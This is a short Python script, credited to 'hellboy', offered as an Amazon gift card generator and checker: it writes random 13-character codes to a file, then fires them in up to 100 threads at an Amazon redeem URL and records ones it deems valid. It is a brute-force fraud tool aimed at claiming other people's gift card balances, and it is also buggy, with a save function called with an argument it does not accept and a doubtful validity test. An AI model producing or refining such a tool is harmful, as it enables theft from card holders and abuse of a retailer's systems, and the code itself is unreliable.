import time, requests, threading, string, random, os
def cls():
    os.system("cls")
def pause():
    os.system("pause>null")
    
os.system("title Amazon Giftcard generator and checker")
cls()
elec= str(input("""
                Writed by hellboy;
                [1] Giftcard gen (Amazon)
                [2] Giftcard checker (Amazon)
                
                -----> """))
if elec=="1":
    cls()
    can=int(input("amount: "))
    fix=0
    f = open('Giftcards.txt', 'a')
    while fix <= can:
        code=('').join(random.choices(string.ascii_letters.upper() + string.digits.upper(), k=13))
        f.write(code.upper() + '\n')
        fix += 1
if elec=="2":
    cls()
    giftcard=[]
    num=0
    valid=0
    invalid=0
    
    
    def load():
        with open('Giftcards.txt', 'r') as f:
            for x in f.readlines():
                giftcard.append(x.strip())
    
    
    def save():
        with open('valid.txt', 'a') as f:
            f.write(giftcard + '\n')
    
    
    def keker():
                global giftcard
                global num
                global invalid
                global valid
                keyword="Enter claim code"
                r = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w", data={"giftcard": giftcard[num]})
                if keyword in r.text:
                    valid += 1
                    print("valid "+giftcard[num])
                    save(giftcard[num])
                else:
                    print("invalid "+giftcard[num])
    load()
    
    while True:
        if threading.active_count() < 100:
            threading.Thread(target=keker, args=()).start()
            time.sleep(0.25)
            num+=1
